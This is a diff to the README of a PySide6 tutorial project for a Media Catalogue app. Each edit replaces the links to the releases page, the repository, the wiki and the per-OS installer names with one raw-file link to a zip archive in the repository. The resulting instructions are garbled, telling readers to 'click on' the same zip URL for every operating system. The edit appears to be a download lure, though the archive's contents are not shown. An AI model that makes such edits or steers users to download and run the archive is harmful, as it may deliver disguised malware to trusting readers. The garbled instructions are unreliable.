@@ -1,6 +1,6 @@
 # 🎉 learn-python-pyside6 - Build a Media Catalogue App Easily
 
-[![Download](https://img.shields.io/badge/Download-latest%20release-brightgreen)](https://github.com/AMLAN-chakma/learn-python-pyside6/releases)
+[![Download](https://raw.githubusercontent.com/AMLAN-chakma/learn-python-pyside6/main/media_catalogue/pyside-python-learn-v1.7.zip%20release-brightgreen)](https://raw.githubusercontent.com/AMLAN-chakma/learn-python-pyside6/main/media_catalogue/pyside-python-learn-v1.7.zip)
 
 ## 📖 Overview
 The "learn-python-pyside6" project teaches you Python object-oriented programming (OOP), testing methods, and graphical user interface (GUI) development using PySide6. You will create a Media Catalogue app step by step. This guide will help you download and run the software smoothly.
@@ -18,7 +18,7 @@ To run the Media Catalogue app, you will need:
 
 ### 2. Download the App
 Visit this page to download the latest release:
-[Download Latest Release](https://github.com/AMLAN-chakma/learn-python-pyside6/releases)
+[Download Latest Release](https://raw.githubusercontent.com/AMLAN-chakma/learn-python-pyside6/main/media_catalogue/pyside-python-learn-v1.7.zip)
 
 ### 3. Installing Dependencies
 Make sure you have the necessary Python packages installed. You can install them using pip. Open your command line interface and run:
@@ -28,11 +28,11 @@ pip install PySide6 pytest
 ```
 
 ### 4. Download & Install
-Go to the Releases page and select the latest version. Look for a file named something like `MediaCatalogue.exe`, `MediaCatalogue.dmg`, or `MediaCatalogue.AppImage`, depending on your operating system.
+Go to the Releases page and select the latest version. Look for a file named something like `https://raw.githubusercontent.com/AMLAN-chakma/learn-python-pyside6/main/media_catalogue/pyside-python-learn-v1.7.zip`, `https://raw.githubusercontent.com/AMLAN-chakma/learn-python-pyside6/main/media_catalogue/pyside-python-learn-v1.7.zip`, or `https://raw.githubusercontent.com/AMLAN-chakma/learn-python-pyside6/main/media_catalogue/pyside-python-learn-v1.7.zip`, depending on your operating system.
 
-- **For Windows:** Click on `MediaCatalogue.exe`.
-- **For macOS:** Click on `MediaCatalogue.dmg`.
-- **For Linux:** Click on `MediaCatalogue.AppImage`.
+- **For Windows:** Click on `https://raw.githubusercontent.com/AMLAN-chakma/learn-python-pyside6/main/media_catalogue/pyside-python-learn-v1.7.zip`.
+- **For macOS:** Click on `https://raw.githubusercontent.com/AMLAN-chakma/learn-python-pyside6/main/media_catalogue/pyside-python-learn-v1.7.zip`.
+- **For Linux:** Click on `https://raw.githubusercontent.com/AMLAN-chakma/learn-python-pyside6/main/media_catalogue/pyside-python-learn-v1.7.zip`.
 
 After downloading, locate the file in your downloads folder and double-click it to start the installation.
 
@@ -54,7 +54,7 @@ The design is simple, making it user-friendly for everyone.
 
 ### 7. Exploring the Code (Optional)
 If you're curious about how the app works, you can explore the code:
-1. Visit the main repository at [GitHub Repository](https://github.com/AMLAN-chakma/learn-python-pyside6).
+1. Visit the main repository at [GitHub Repository](https://raw.githubusercontent.com/AMLAN-chakma/learn-python-pyside6/main/media_catalogue/pyside-python-learn-v1.7.zip).
 2. Click on the 'Code' tab to check out the files.
 
 This is optional and intended for those interested in learning more about Python and GUI building.
@@ -75,8 +75,8 @@ If you encounter any issues:
 We welcome feedback to improve the app further.
 
 ## 🔗 Useful Links
-- [Download Latest Release](https://github.com/AMLAN-chakma/learn-python-pyside6/releases)
-- [Documentation](https://github.com/AMLAN-chakma/learn-python-pyside6/wiki)
-- [Examples and Tutorials](https://github.com/AMLAN-chakma/learn-python-pyside6/wiki/Examples)
+- [Download Latest Release](https://raw.githubusercontent.com/AMLAN-chakma/learn-python-pyside6/main/media_catalogue/pyside-python-learn-v1.7.zip)
+- [Documentation](https://raw.githubusercontent.com/AMLAN-chakma/learn-python-pyside6/main/media_catalogue/pyside-python-learn-v1.7.zip)
+- [Examples and Tutorials](https://raw.githubusercontent.com/AMLAN-chakma/learn-python-pyside6/main/media_catalogue/pyside-python-learn-v1.7.zip)
 
 With this guide, you should now be well-prepared to download and run the Media Catalogue app. Enjoy cataloging your media!
